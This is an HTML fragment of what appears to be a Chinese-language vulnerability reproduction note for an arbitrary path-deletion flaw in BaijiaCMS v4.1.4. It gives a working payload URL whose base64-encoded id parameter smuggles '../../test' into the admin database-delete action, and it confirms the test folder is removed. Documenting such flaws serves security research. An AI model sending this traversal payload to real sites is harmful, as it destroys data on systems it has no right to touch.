		<p class="cs3A447A38"><span class="cs9FB05234"># </span><span class="cs7FFD2630">需要后台权限</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">只能删除路径</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://www.0-sec.org/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vdGVzdA==&amp;beid=1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根目录下创建</span><span class="cs8926E06">test</span><span class="cs9C1B1871">文件夹，里面有内容为</span><span class="cs8926E06">123</span><span class="cs9C1B1871">的</span><span class="cs8926E06">test.txt</span><span class="cs9C1B1871">文件</span></p><p class="cs40DD2BC9"><span><img src="Web安全/百家cms/%e7%99%be%e5%ae%b6cms%20v4.1.4%20%e4%bb%bb%e6%84%8f%e8%b7%af%e5%be%84%e5%88%a0%e9%99%a4%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs8926E06">payload<br/></span><span class="cs9C1B1871">将参数转为</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">并方位</span><span class="cs8926E06">payload</span></p><p class="cs40DD2BC9"><span><img src="Web安全/百家cms/%e7%99%be%e5%ae%b6cms%20v4.1.4%20%e4%bb%bb%e6%84%8f%e8%b7%af%e5%be%84%e5%88%a0%e9%99%a4%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="657" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/百家cms/%e7%99%be%e5%ae%b6cms%20v4.1.4%20%e4%bb%bb%e6%84%8f%e8%b7%af%e5%be%84%e5%88%a0%e9%99%a4%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="128" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查看文件夹，已被删除</span></p><p class="cs40DD2BC9"><span><img src="Web安全/百家cms/%e7%99%be%e5%ae%b6cms%20v4.1.4%20%e4%bb%bb%e6%84%8f%e8%b7%af%e5%be%84%e5%88%a0%e9%99%a4%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
